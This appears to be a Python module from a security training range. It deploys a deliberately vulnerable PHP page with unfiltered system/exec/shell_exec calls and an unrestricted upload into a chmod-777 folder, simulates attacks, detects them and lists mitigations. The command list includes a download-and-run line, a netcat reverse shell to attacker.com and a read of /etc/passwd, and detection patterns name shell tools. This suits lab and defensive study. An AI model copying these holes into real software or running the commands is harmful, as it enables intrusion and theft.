import random
from typing import Dict, List, Any
from .base import BaseVulnerability, VulnerabilityFactory

class RCEVulnerability(BaseVulnerability):
    """远程代码执行漏洞"""
    
    def __init__(self):
        super().__init__(
            name="远程代码执行",
            description="应用未正确过滤输入，导致可执行任意系统命令",
            severity="critical",
            cve_id="CVE-2021-3456"
        )
        
    def deploy(self, vm, vm_name: str, session_dir: str) -> bool:
        """部署RCE漏洞环境"""
        try:
            # 创建易受RCE攻击的页面
            php_code = """<?php
// 命令执行漏洞 - 通过system函数
if (isset($_GET['cmd'])) {
    $cmd = $_GET['cmd'];  // 未过滤，存在命令注入
    echo "<pre>";
    system($cmd);
    echo "</pre>";
}

// 通过exec函数
if (isset($_GET['exec'])) {
    $cmd = $_GET['exec'];
    echo "<pre>";
    exec($cmd, $output);
    echo implode("\\n", $output);
    echo "</pre>";
}

// 通过shell_exec
if (isset($_GET['shell'])) {
    $cmd = $_GET['shell'];
    echo "<pre>";
    echo shell_exec($cmd);
    echo "</pre>";
}

// 文件上传漏洞 - 可上传Webshell
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_FILES['file'])) {
    $upload_dir = 'uploads/';
    if (!is_dir($upload_dir)) {
        mkdir($upload_dir);
    }
    
    $filename = $_FILES['file']['name'];
    $upload_path = $upload_dir . $filename;
    
    if (move_uploaded_file($_FILES['file']['tmp_name'], $upload_path)) {
        echo "文件上传成功: <a href='$upload_path'>$filename</a>";
    } else {
        echo "上传失败";
    }
}
?>

<html>
<body>
    <h1>RCE测试页面</h1>
    
    <h2>命令执行测试</h2>
    <form method="GET">
        命令: <input type="text" name="cmd" value="ls -la">
        <input type="submit" value="执行(system)">
    </form>
    
    <form method="GET">
        命令: <input type="text" name="exec" value="whoami">
        <input type="submit" value="执行(exec)">
    </form>
    
    <h2>文件上传</h2>
    <form method="POST" enctype="multipart/form-data">
        <input type="file" name="file">
        <input type="submit" value="上传">
    </form>
</body>
</html>"""
            
            vm.execute_ssh_command(
                session_dir,
                vm_name,
                f"sudo bash -c 'cat > /var/www/html/rce.php << \"EOF\"\n{php_code}\nEOF'"
            )
            
            # 创建上传目录
            vm.execute_ssh_command(
                session_dir,
                vm_name,
                "sudo mkdir -p /var/www/html/uploads && sudo chmod 777 /var/www/html/uploads"
            )
            
            return True
        except Exception:
            return False
    
    def exploit(self, target_info: Dict[str, Any]) -> Dict[str, Any]:
        """执行RCE攻击"""
        ip = target_info.get('ip', 'unknown')
        
        commands = [
            'whoami',
            'id',
            'cat /etc/passwd',
            'ls -la /root',
            'uname -a',
            'wget http://attacker.com/shell.php',
            'curl http://attacker.com/backdoor.sh | bash',
            'nc -e /bin/sh attacker.com 4444'
        ]
        
        selected_command = random.choice(commands)
        success = random.random() > 0.4
        
        result = {
            'vulnerability': self.name,
            'target': ip,
            'command': selected_command,
            'success': success,
            'details': {}
        }
        
        if success:
            result['details'] = {
                'output': f"命令执行成功，输出示例: root:x:0:0:root:/root:/bin/bash\nuser:x:1000:1000:user:/home/user:/bin/bash",
                'access_level': random.choice(['www-data', 'root']),
                'execution_method': random.choice(['system()', 'exec()', 'shell_exec()'])
            }
        
        return result
    
    def detect(self, logs: str) -> Dict[str, Any]:
        """检测RCE攻击"""
        indicators = [
            "system(",
            "exec(",
            "shell_exec(",
            "passthru(",
            "`whoami`",
            "eval(",
            "wget http",
            "curl http",
            "nc -e",
            "bash -i",
            "perl -e",
            "python -c"
        ]
        
        detected = False
        matched_indicators = []
        
        logs_lower = logs.lower()
        for indicator in indicators:
            if indicator.lower() in logs_lower:
                detected = True
                matched_indicators.append(indicator)
        
        confidence = len(matched_indicators) * 0.25 if detected else 0
        confidence = min(confidence, 1.0)
        
        return {
            'detected': detected,
            'confidence': confidence,
            'indicators': matched_indicators,
            'attack_type': self.name
        }
    
    def get_indicators(self) -> List[str]:
        return ["system(", "exec(", "shell_exec(", "wget", "curl", "nc -e"]
    
    def get_mitigation(self) -> List[str]:
        return [
            "避免使用命令执行函数",
            "输入严格过滤",
            "使用白名单机制",
            "最小权限运行应用",
            "禁用危险函数"
        ]

# 注册漏洞
VulnerabilityFactory.register('rce', RCEVulnerability)
VulnerabilityFactory.register('command_injection', RCEVulnerability)